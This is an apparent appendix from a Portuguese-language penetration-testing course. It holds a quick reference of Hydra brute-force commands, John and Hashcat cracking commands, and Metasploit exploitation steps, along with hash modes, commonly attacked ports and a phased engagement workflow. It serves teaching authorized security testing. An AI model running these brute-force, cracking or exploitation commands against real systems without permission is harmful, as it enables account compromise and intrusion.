## Apêndice B — Referência Rápida

### Qual ferramenta usar?

| Cenário | Primária | Alternativa |
|---------|----------|-------------|
| Credencial em texto já encontrada | Hydra `-p senha` (1 tentativa) | ssh/ftp manual |
| Brute force SSH/FTP | Hydra | Medusa, Ncrack |
| Brute force HTTP form | Hydra `http-post-form` | Burp Intruder (Módulo 02) |
| Brute force SMB/RDP | Hydra | CrackMapExec (Módulo 04) |
| Identificar hash | hashid | hashcat `--example-hashes` |
| Crackear hash (CPU/muitos formatos) | John | hashcat |
| Crackear hash (GPU/volume) | Hashcat | John |
| Wordlist do alvo | CeWL | Crunch (padrões) |
| Buscar exploit | Searchsploit | Google/Exploit-DB online |
| Explorar CVE | Metasploit | Script standalone do Searchsploit |
| Confirmar vuln antes de explorar | `msf6 > check` | auxiliar scanner |
| Gerar payload/reverse shell | Metasploit (msfvenom) | netcat/bash manual |

### Comandos que você vai mais usar

```bash
# === FASE 3 — HYDRA ===
hydra -l admin -P wordlist.txt -t 4 -f ssh://10.0.0.1
hydra -L users.txt -P wordlist.txt -t 4 -f ftp://10.0.0.1
hydra -L users.txt -P wordlist.txt -t 1 -W 3 -f host http-post-form "/login:user=^USER^&pass=^PASS^:F=erro"

# === FASE 4 — CRACKING ===
hashid 'HASH'
john --wordlist=wordlist.txt --rules hashes.txt
john --show hashes.txt
hashcat -m 0 hashes.txt rockyou.txt -o cracked.txt
hashcat -m 0 --show hashes.txt
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# === FASE 5 — METASPLOIT ===
msfconsole
search <cve ou serviço>
use <exploit>
show options
set RHOSTS 10.0.0.1
set LHOST <seu IP>
check
exploit
sessions -i 1
sessions -k all
spool arquivo.log   # gravar tudo do console

# === FASE 6 — VALIDAÇÃO ===
ssh user@host "whoami; hostname"
sysinfo / getuid    # (meterpreter)
curl -i -X POST url -d "user&pass"   # validar login web
```

### Modos de hash (Hashcat) mais usados

| `-m` | Tipo | Exemplo |
|:---:|------|---------|
| 0 | MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| 100 | SHA1 | 40 hex |
| 1400 | SHA-256 | 64 hex |
| 1000 | NTLM | Windows |
| 3200 | bcrypt | `$2a$10$...` |
| 1800 | sha512crypt | `$6$...` |
| 500 | md5crypt | `$1$...` |
| 5500 | NetNTLMv2 | `user::domain:...` |

### Portas comuns de ataque

| Porta | Serviço | Ferramenta típica |
|:---:|---------|-------------------|
| 21 | FTP | Hydra `ftp://` |
| 22 | SSH | Hydra `ssh://` |
| 23 | Telnet | Hydra `telnet://` (nunca em produção) |
| 445 | SMB | Hydra `smb://` / Metasploit |
| 1433 | MSSQL | Hydra `mssql://` |
| 3306 | MySQL | Hydra `mysql://` |
| 3389 | RDP | Hydra `rdp://` |
| 5432 | PostgreSQL | Hydra `postgres://` |
| 80/443 | HTTP(S) | Hydra `http-post-form` |

### Fluxo visual

```
MÓDULO 01 (recon) + MÓDULO 02 (web)
    ↓
FASE 1: Alimentação
    ↓ importa serviços, CVEs, logins, usernames, hashes
FASE 2: Priorização
    ↓ searchsploit → matriz de vetores → escopo
FASE 3: Brute Force
    ↓ Hydra: SSH → FTP → HTTP form → SMB/RDP
FASE 4: Cracking
    ↓ hashid → john → hashcat → regras/máscaras
FASE 5: Exploração
    ↓ searchsploit → msfconsole → check → exploit → sessão
FASE 6: Validação
    ↓ confirmar acesso → impacto → encerrar tudo
FASE 7: Relatório
    ↓ resumo → descobertas → métricas → recomendações
    ↓
FIM ✓ → Módulo 04 (pós-exploração)
```

---
